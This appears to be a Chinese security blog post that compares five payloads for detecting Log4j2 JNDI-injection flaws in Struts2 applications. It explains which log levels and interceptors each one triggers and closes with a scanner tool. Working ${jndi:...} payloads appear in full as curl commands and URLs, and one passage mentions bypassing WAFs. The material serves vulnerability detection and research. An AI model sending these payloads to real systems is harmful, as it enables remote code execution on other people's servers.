<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/r6XG_wDp0F2pjGc2OklqAw)

 **Part1 前言** 

Log4j2 漏洞出现有大半年的时间了，这个核弹级别的漏洞危害很大，但是这个漏洞检测起来却很麻烦，因为黑盒测试无法预判网站哪个应用功能在后台调用了 log4j2 记录日志功能。目前通用的做法就是使用 burpsuite 插件进行被动扫描，原理就是把所有与用户交互参数都用各种 log4j2 检测 payload 测试一遍，然后观察 DNSlog 中有没有访问记录。这个漏洞检测方法和 SQL 注入、XSS 漏洞有点像，常规方法很难完全发现漏洞，有时候就连研发人员自己也搞不清楚哪些应用功能点调用了 log4j2，**所以这个漏洞在相当长的时间里会一直存在**。

在这里面要特别说明一下，burpsuite 的被动插件扫描的方式，并不能完全发现 Log4j2 漏洞，因为有的 log4j2 漏洞需要特定的条件才能触发，有时候需要手工构造一个特殊 URL 路径，有时候需要发送一些框架特有的参数、消息头等等，有的框架如 Struts2、Spring 等需要构造特殊的数据包才能触发 log4j2 漏洞。网上有很多 Struts2 下 log4j2 漏洞检测专项方法，但是貌似并没有引起大家的重视。我大概有 4、5 年没看过 Struts2 框架的代码了，但毕竟对 Struts2 漏洞有感情了，所以就各种搜索把网上的各种检测方式汇总起来，搭建环境，跟踪代码，对各种检测方法进行对比，最后给出 2 个可靠好用的检测 Struts2 框架下 Log4j2 漏洞的方法。

 **Part2 技术研究过程** 

*   **Struts2 与 log4j2 日志级别配置**
    

如下图所示，这是 log4j2 组件中关于日志级别的定义。日志输出级别共有 8 个，按照优先级从低到高为：All < Trace < Debug < Info < Warn < Error < Fatal < OFF。

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450Ap8wVQ77lnH6mWk8wxNs9yXHVBAAzyO2Lia8T2FicbEEnxzibZRFovquwudYjvsiaeuCJZaqbj3uFtHw/640?wx_fmt=png)

接下来还要重点关注 Struts2 框架中 log4j2.xml 文件的配置，主要看 **<Logger />** 这部分内容，因为几乎所有的 Struts2 框架中的 log4j2 代码执行漏洞，都在 org.apache.struts2 路径下，观察其配置的是 info 级别、还是 warn 级别，还是 debug 级别。这个级别对应的数字值越高，则越有可能触发 log4j2 漏洞。**如果 Logger 配置的是 info 级别，由于 info 优先级比 debug 高，所以 debug 级别的 log4j2 的各种 POC 都没法执行，这也是为什么同样的 log4j2 的 POC，有的网友本地环境能测试成功，有的不能成功，这是因为对于 org.apache.struts2 路径日志级别配置有所不同。**

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450Ap8wVQ77lnH6mWk8wxNs9yVuDjQiahb910CpRsk16kVgZDkuThHB2fxLGecpibb2QG3x5gtppicZQicw/640?wx_fmt=png)

*   **Struts2 拦截器简介**
    

要想理解 Struts2 框架下 log4j2 漏洞检测方法，首先需要了解一下 Struts2 的拦截器。当时 Log4j2 漏洞刚爆出的时候，我就感觉 Struts2 的拦截器中应该会有 log4j2 漏洞，因为所有的用户请求都会经过拦截器去处理，拦截器栈上那么多拦截器实现，其中肯定有各种 log 输出功能，所以应该会有漏洞。

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450Ap8wVQ77lnH6mWk8wxNs9yYalIEiaABOp0f6vXeJ7wF7Z3r6N3QrCtP4Dt3hqrUDISaZVRHPxwO9g/640?wx_fmt=png)

1.  请求先到达 Filter 中央控制器；2.  然后为 Action 创建代理类；3.  将各个服务存放在拦截器中，执行完拦截器后再去执行 action 类，action 类调用 service，再调用 dao；4.  得到结果字符串，创建 result 对象；5.  转向相应的视图。

归纳为一点：Struts2 几乎所有的请求，都会经过拦截器栈的处理，拦截器栈上有各种各样的拦截器，而有的拦截器调用了 log4j2 输出日志功能，我们只需构造符合要求的 http 请求，就会触发 Log4j2 漏洞。接下来看看网上收集到的 5 个漏洞检测 poc，挨个看一下，从中挑选比较好的检测 POC，以便在日常工作中事半功倍。

*   **方法 1：静态文件 If-Modified-Since 头**
    

此检测 payload 摘自 p1ay2win 天玄安全实验室原创，检测 payload 如下：

curl -vv -H "If-Modified-Since: \${jndi:rmi:\${::-/}/localhost:8888/Calc}" http://192.168.217.1:8080/helloworld_war/struts/utils.js

**检测原理：****warn 级别**，当用户访问 Struts2 框架的静态文件时，如果请求头 **If-Modified-Since** 的值为非 Date 型，将会触发 log.warn()，导致 log4j2 代码执行漏洞。

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450Ap8wVQ77lnH6mWk8wxNs9y9b6X15WicM81RV7ecF92zgqV7md7eAKDdZ31jdZZQ2Jv0N4WXjbo4nQ/640?wx_fmt=png)

**优缺点：****这是我个****人比较推荐的一种检测方法**。首先，它的日志级别是 Log.warn()，比 log.debug() 写法优先级要高，因此成功率更大一些。其次 / struts/utils.js 这个文件是多数 Struts2 框架内置的静态文件。但缺点是，**不是所有版本的 struts2 jar 包中都存在这个静态文件**，很多低版本的 jar 包中并不存在，所以这个方法需要总结出能够涵盖多个不同版本的 Struts2 框架的静态文件路径才行。

如下图所示，2.0.11 版本 jar 包中不存在 utils.js 文件：

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450Ap8wVQ77lnH6mWk8wxNs9yWiaeUmlWjmN7ib5nbMfhiaRI2uWbhfYbicCOjEUoSRYibwY8QQeDDnl0QNg/640?wx_fmt=png)

如下图所示，而 2.5.13 版本的 jar 包中存在 utils.js 这个文件：

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450Ap8wVQ77lnH6mWk8wxNs9yiafkJZICkvOFl0G24Sq53CsdPz9EeQuxMickcMgOibuQLYUbQSxphK4icg/640?wx_fmt=png)

*   **方法 2：检查请求参数长度**
    

此检测 payload 摘自 p1ay2win 天玄安全实验室原创，检测 payload 如下：

http://localhost:8080/helloworld_war/hello.action?$%7Bjndi:rmi://127.0.0.1:8888/Calc%7Daaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=123

**检测原理：****debug 级别**，访问一个存在的 Struts2 框架的 action 地址，Struts2 框架会检查请求参数名的长度，若长度超过默认的 100 个字符，请求参数名则会输出到 debug 日志中，触发 log4j2 漏洞。

**优缺点：**这个方法测试效果不错，更重要的是同时支持 GET 请求和 POST 请求，在将来遇到 WAF 设备拦截时，可以用更多的手段去绕过 waf 设备拦截。缺点是日志级别的优先级是 debug。

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450Ap8wVQ77lnH6mWk8wxNs9yBST9AiaErfdhA2VQkoHz91l1k5k7WKyH3q0jxUrfzk73aA1VaajQnicw/640?wx_fmt=png)

*   **方法 3：检查请求路径触发**
    

此检测 payload 摘自 p1ay2win 天玄安全实验室原创，检测 payload 如下：

http://localhost:8080/helloworld_war/$%7Bjndi:rmi:$%7B::-/%7D/127.0.0.1:8888/Calc%7D/

本地测试怎么都测试不成功，**发现需要将 rmi 替换成 ldap**

http://localhost:8080/helloworld_war/$%7Bjndi:ldap:$%7B::-/%7D/127.0.0.1:8888/Calc%7D/

**检测原理：****warn 级别**，Struts2 框架下 URL 路径的 action 名如果不在 [a-zA-Z0-9._!/\-] 范围以内，将会触发 LOG.warn()，导致 log4j2 代码执行漏洞。

**优缺点：**第一眼看到上述 POC，就感觉检测 payload 中那几个反斜杠肯定会导致 POC 不能正常执行。但是文章作者给出了一个很好的解决方法：“在请求路径中两个相邻的 / 会被转换为一个 /，**将其中一个 / 替换为 ${::-/} 可防止被转换**”。缺点是有的版本 Struts2 框架中 DefaultActionMapper 类中没有 cleanupActionName 方法，导致此流程的 log4j2 不能用。

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450Ap8wVQ77lnH6mWk8wxNs9yym9FqicbTGdOLXhGQQc84XQSfN6xIemolsQhlYFfJlWyzgxnqiasLWmw/640?wx_fmt=png)

*   **方法 4：checkbox 拦截器**
    

此检测方法摘自安全客 saound 的检测方法，检测 payload 如下：

http://127.0.0.1:8080/Struts2WebAppDemo/index.action?__checkbox_${jndi:ldap://127.0.0.1:1099/exp}=a&__checkbox_${jndi:ldap://127.0.0.1:1099/exp}=b

**检测原理：****debug 级别**，这个检测方法，基于 struts2 自带的拦截器，当请求参数名以 __checkbox_ 开始并且重复定义时，会进入 log4j2 记录分支，执行 LOG.debug() 执行，故构造请求如下：

**优缺点：**方法挺好的，唯一的缺点就是日志级别是 debug 级别的。

2.3.14.2 版本代码如下：

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450Ap8wVQ77lnH6mWk8wxNs9y0RxGz7PzqETKzFXibiaGDr9ib4IxWbKneHbssD2TWL7vSZiapx9ABdZs8g/640?wx_fmt=png)

2.5.12 版本代码如下：

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450Ap8wVQ77lnH6mWk8wxNs9yyAMeBhaKYXDklvtn0VrmOEByqHuiccffgeF5UJFBhfD7ODJSCjGJ1bg/640?wx_fmt=png)

*   **方法 5：struts.token.name**
    

此 payload 收集于网络，原创作者不知道是谁，检测 payload 如下：

http://127.0.0.1:8080/struts2-showcase/token/transfer4.action -d struts.token.name='${jndi:rmi://127.0 .0.1:1099/ylbtsl}'

**优缺点：****debug 级别**，这个 payload 看起来不错，构造简单，编写脚本去扫描也比较省事。通过 struts.token.name 可知，**我猜触发点应该是在 token 拦截器中**。我本地经过测试，大致判断应该是 log.debug 级别的，这里就不详细分析了。

综上所述，最终通过对比这 5 个检测 payload，**个人结论是方法 1：获取静态文件 If-Modified-Since 头” 这种方法成功率更高一些，其次是方法 3：检测请求路径触发**。目前放出的检测 POC，也仅有这两个 payload 是 WARN 级别的，所以它是成功率较高的检测 POC。缺点是，对于不了解 Struts2 框架的新手，定位静态文件是个麻烦事，写扫描规则也麻烦。

*   ****编写**检测工具融合 payload**
    

为了避免人为记录 DNSLog 的嫌疑，我没有在工具中使用 DNSLog 的 api 接口，大家需要手工设置自己的 log4j2 DNSlog 地址。注意，我写的工具这里的 “Log4j2 DNSLog 地址：” 这个检测功能，**只针对 Struts2 框架下的 log4j2 检测功能**，并不通用所有的 log4j2 漏洞检测。

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450Ap8wVQ77lnH6mWk8wxNs9yNUKLATSJttPj743T8d6sVKFoQAhh4ibQ8YjvwBedLZc7HI3c8OWCvJw/640?wx_fmt=png)

 **Part3 总结**   

**1.** 网上的针对 Struts2 框架下 log4j2 漏洞的检测 POC，触发点目前看来就是 2 种，log.warn() 或者是 log.debug()，那么优先选择触发点在 log.warn() 的检测 payload。  

**2.** 了解一下 log4j2 漏洞的原理，可以避免在实战中做很多的无用功。使用 “静态文件 If-Modified-Since 头” 这种检测方法时，要注意 Struts2 框架自带静态文件的正确 URL 位置，不要生搬硬套检测 POC。

参考链接：

https://www.anquanke.com/post/id/262852

[https://mp.weixin.qq.com/s/19oIId_Ax2nxJ00k6vFhDg](https://mp.weixin.qq.com/s?__biz=MzAwNTI1NDI3MQ==&mid=2649617002&idx=1&sn=cd1c73a7965999a930c6d2376dcea536&scene=21#wechat_redirect)

https://blog.csdn.net/weixin_39604280/article/details/111104622

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450A5qqg2iaK6KIYYR8y6pF5Rh3JHDibOKOop204nXz618iawdRb8dABicMPtHb2PkJE8x6koJO5HyuwZJQ/640?wx_fmt=png)

专注于网络安全技术分享，包括红队、蓝队、日常渗透测试、安全体系建设等

每周一篇，99% 原创，敬请关注

![](https://mmbiz.qpic.cn/mmbiz_jpg/OAz0RNU450A5qqg2iaK6KIYYR8y6pF5Rhn137KeqqlDkuRyY4G61jATRzyOrCBts8ucxkLpMNsYutSOY7BkPziaw/640?wx_fmt=jpeg)